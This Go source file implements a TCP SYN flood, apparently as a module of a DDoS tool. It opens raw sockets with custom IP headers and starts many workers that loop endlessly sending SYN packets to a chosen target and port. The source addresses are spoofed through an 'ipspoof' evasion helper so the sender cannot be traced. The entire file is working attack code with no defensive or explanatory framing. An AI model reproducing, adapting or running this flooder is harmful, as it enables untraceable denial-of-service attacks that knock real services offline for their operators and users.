package synflood

import (
	"net"
	"orchardnet-api/evasion/ipspoof"
	"orchardnet-api/utils/packet"
	"syscall"
)

func Launch(target string, port int, workers int) {
	for i := 0; i < workers; i++ {
		go func() {
			// Create raw socket
			fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
			if err != nil {
				return
			}
			defer syscall.Close(fd)

			// Enable IP_HDRINCL to send packets with custom IP headers
			err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
			if err != nil {
				return
			}

			// Parse target IP
			targetIP := net.ParseIP(target).To4()
			if targetIP == nil {
				return
			}

			addr := syscall.SockaddrInet4{
				Port: 0,
			}
			copy(addr.Addr[:], targetIP)

			for {
				for j := 0; j < 100; j++ {
					srcIP := ipspoof.GenerateByCountry("US")
					pkt := packet.BuildTCPSYN(srcIP, target, port)
					syscall.Sendto(fd, pkt, 0, &addr)
				}
			}
		}()
	}
}
